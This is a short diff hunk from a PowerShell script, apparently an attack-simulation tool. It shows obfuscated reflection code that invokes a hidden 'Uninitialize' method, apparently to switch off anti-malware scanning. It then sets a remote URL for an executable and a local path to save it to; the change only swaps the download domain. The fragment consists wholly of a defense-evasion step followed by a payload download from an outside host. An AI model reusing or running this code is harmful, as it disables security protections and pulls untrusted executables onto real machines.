@@ -42,7 +42,7 @@ $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Objec
 $Uninitialize.Invoke($object,$null)
 
 # Set the URL for the file to download
-$url = "https://ky.reyes-holdings.uk/test.exe"
+$url = "https://ky.attck.community/test.exe"
 
 # Set the path to save the downloaded file
 $filePath = "C:\Temp\testing.exe"
